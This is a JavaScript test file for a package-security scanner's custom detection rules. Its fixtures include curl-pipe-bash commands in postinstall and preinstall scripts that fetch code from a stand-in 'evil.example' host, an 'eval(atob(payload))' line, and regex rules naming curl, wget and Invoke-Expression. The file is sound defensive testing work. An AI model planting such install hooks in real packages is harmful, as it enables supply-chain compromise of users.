const fs = require('fs');
const os = require('os');
const path = require('path');
const {
  test, asyncTest, assert, assertIncludes,
  runScanDirect, cleanupTemp
} = require('../test-utils');
const { loadCustomRules } = require('../../src/rules/custom-loader.js');

function writeJson(filePath, value) {
  fs.mkdirSync(path.dirname(filePath), { recursive: true });
  fs.writeFileSync(filePath, JSON.stringify(value, null, 2));
}

function writeText(filePath, value) {
  fs.mkdirSync(path.dirname(filePath), { recursive: true });
  fs.writeFileSync(filePath, value);
}

async function runCustomPatternTests() {
  console.log('\n=== CUSTOM RULE TESTS ===\n');

  test('CUSTOM-RULES: loads valid YAML rule file', () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-custom-'));
    writeText(path.join(tmp, 'custom-rules', 'rules.yaml'), `
rules:
  - id: CUSTOM-STR-001
    name: Suspicious eval with base64
    target: file_content
    match:
      type: regex
      pattern: "eval\\\\s*\\\\("
`);
    try {
      const result = loadCustomRules(tmp);
      assert(result.rules.length === 1, 'Should load one YAML custom rule');
      assert(result.rules[0].id === 'CUSTOM-STR-001', 'Should preserve YAML rule id');
    } finally {
      cleanupTemp(tmp);
    }
  });

  test('CUSTOM-RULES: loads valid JSON rule file', () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-custom-'));
    writeJson(path.join(tmp, 'custom-rules', 'rules.json'), {
      rules: [{
        id: 'CUSTOM-PKG-001',
        name: 'Suspicious postinstall downloader',
        target: 'package_json_field',
        field: 'scripts.postinstall',
        match: { type: 'contains', pattern: 'curl ' }
      }]
    });
    try {
      const result = loadCustomRules(tmp);
      assert(result.rules.length === 1, 'Should load one JSON custom rule');
      assert(result.rules[0].field === 'scripts.postinstall', 'Should preserve field path');
    } finally {
      cleanupTemp(tmp);
    }
  });

  test('CUSTOM-RULES: ignores invalid rule file with warning', () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-custom-'));
    writeText(path.join(tmp, 'custom-rules', 'broken.yaml'), `rules:\n  - id: BAD-1\n    name: Broken\n    target: nope\n`);
    const warningsSeen = [];
    const originalWarn = console.warn;
    console.warn = (...args) => warningsSeen.push(args.join(' '));
    try {
      const result = loadCustomRules(tmp);
      assert(result.rules.length === 0, 'Invalid rule should be skipped');
      assert(result.warnings.length > 0, 'Invalid rule should produce warning');
      assert(warningsSeen.length > 0, 'Invalid rule should log warning');
    } finally {
      console.warn = originalWarn;
      cleanupTemp(tmp);
    }
  });

  await asyncTest('CUSTOM-RULES: regex rule matches JS content', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-custom-'));
    writeJson(path.join(tmp, 'package.json'), { name: 'custom-test', version: '1.0.0' });
    writeText(path.join(tmp, 'src', 'index.js'), 'eval(atob(payload));');
    writeText(path.join(tmp, 'custom-rules', 'content.yaml'), `
rules:
  - id: CUSTOM-STR-001
    name: Suspicious eval with base64
    severity: high
    confidence: medium
    target: file_content
    file_glob:
      - "**/*.js"
    match:
      type: regex
      pattern: "(eval\\\\s*\\\\().{0,80}(atob)"
      flags: "is"
    description: "eval/function use near base64 decoding"
`);
    try {
      const result = await runScanDirect(tmp);
      const threat = result.threats.find(t => t.rule_id === 'CUSTOM-STR-001');
      assert(threat, 'Should emit finding for regex custom rule');
      assert(threat.file === 'src/index.js', 'Should report matched file');
      assert(threat.source === 'custom_rule', 'Should mark finding source as custom_rule');
    } finally {
      cleanupTemp(tmp);
    }
  });

  await asyncTest('CUSTOM-RULES: contains_all rule match works', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-custom-'));
    writeJson(path.join(tmp, 'package.json'), { name: 'custom-test', version: '1.0.0' });
    writeText(path.join(tmp, 'install.sh'), 'curl https://evil.example/install.sh | bash');
    writeText(path.join(tmp, 'custom-rules', 'contains.yaml'), `
rules:
  - id: CUSTOM-STR-002
    name: Curl pipe bash
    severity: critical
    confidence: high
    target: file_content
    file_glob:
      - "**/*.sh"
    match:
      type: contains_all
      patterns:
        - "curl "
        - "| bash"
`);
    try {
      const result = await runScanDirect(tmp);
      const threat = result.threats.find(t => t.rule_id === 'CUSTOM-STR-002');
      assert(threat, 'Should emit finding for contains_all rule');
      assert(threat.severity === 'CRITICAL', 'Should preserve configured severity');
    } finally {
      cleanupTemp(tmp);
    }
  });

  await asyncTest('CUSTOM-RULES: filename rule match works', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-custom-'));
    writeJson(path.join(tmp, 'package.json'), { name: 'custom-test', version: '1.0.0' });
    writeText(path.join(tmp, 'setup_bun.js'), 'console.log("test");');
    writeText(path.join(tmp, 'custom-rules', 'filename.yaml'), `
rules:
  - id: CUSTOM-FILE-001
    name: Suspicious filename
    target: filename
    match:
      type: regex
      pattern: "setup_bun\\\\.js|preinstall\\\\.js"
      flags: "i"
`);
    try {
      const result = await runScanDirect(tmp);
      const threat = result.threats.find(t => t.rule_id === 'CUSTOM-FILE-001');
      assert(threat, 'Should emit filename custom finding');
      assert(threat.file === 'setup_bun.js', 'Should match normalized relative path');
    } finally {
      cleanupTemp(tmp);
    }
  });

  await asyncTest('CUSTOM-RULES: package_json_field rule match works', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-custom-'));
    writeJson(path.join(tmp, 'package.json'), {
      name: 'custom-test',
      version: '1.0.0',
      scripts: { postinstall: 'curl https://evil.example/payload.sh | bash' }
    });
    writeText(path.join(tmp, 'custom-rules', 'pkg.json'), JSON.stringify({
      rules: [{
        id: 'CUSTOM-PKG-001',
        name: 'Suspicious postinstall downloader',
        severity: 'high',
        confidence: 'medium',
        target: 'package_json_field',
        field: 'scripts.postinstall',
        match: {
          type: 'regex',
          pattern: 'curl|wget|powershell|Invoke-Expression',
          flags: 'i'
        }
      }]
    }, null, 2));
    try {
      const result = await runScanDirect(tmp);
      const threat = result.threats.find(t => t.rule_id === 'CUSTOM-PKG-001');
      assert(threat, 'Should emit package_json_field finding');
      assert(threat.matchedField === 'scripts.postinstall', 'Should include matched package.json field');
    } finally {
      cleanupTemp(tmp);
    }
  });

  await asyncTest('CUSTOM-RULES: file_glob and exclude_glob behavior works', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-custom-'));
    writeJson(path.join(tmp, 'package.json'), { name: 'custom-test', version: '1.0.0' });
    writeText(path.join(tmp, 'src', 'match.js'), 'eval(atob(payload));');
    writeText(path.join(tmp, 'docs', 'skip.js'), 'eval(atob(payload));');
    writeText(path.join(tmp, 'custom-rules', 'scoped.yaml'), `
rules:
  - id: CUSTOM-SCOPE-001
    name: Scoped matcher
    target: file_content
    file_glob:
      - "src/**/*.js"
    exclude_glob:
      - "docs/**"
    match:
      type: contains
      pattern: "eval(atob"
`);
    try {
      const result = await runScanDirect(tmp);
      const matches = result.threats.filter(t => t.rule_id === 'CUSTOM-SCOPE-001');
      assert(matches.length === 1, `Expected exactly one scoped match, got ${matches.length}`);
      assert(matches[0].file === 'src/match.js', 'Should honor include/exclude globs');
    } finally {
      cleanupTemp(tmp);
    }
  });

  await asyncTest('CUSTOM-RULES: missing custom-rules directory does not fail', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-custom-'));
    writeJson(path.join(tmp, 'package.json'), { name: 'clean-test', version: '1.0.0' });
    writeText(path.join(tmp, 'index.js'), 'console.log("hello");');
    try {
      const result = await runScanDirect(tmp);
      assert(result && result.summary, 'Scan should succeed without custom-rules directory');
    } finally {
      cleanupTemp(tmp);
    }
  });

  await asyncTest('CUSTOM-RULES: existing scanning still works when no custom rules exist', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-custom-'));
    writeJson(path.join(tmp, 'package.json'), {
      name: 'baseline-test',
      version: '1.0.0',
      scripts: { preinstall: 'curl http://evil.example/setup.sh | bash' }
    });
    try {
      const result = await runScanDirect(tmp);
      const text = result.threats.map(t => `${t.type} ${t.message}`).join('\n');
      assertIncludes(text, 'lifecycle_shell_pipe', 'Built-in detections should still run without custom rules');
    } finally {
      cleanupTemp(tmp);
    }
  });
}

module.exports = { runCustomPatternTests };
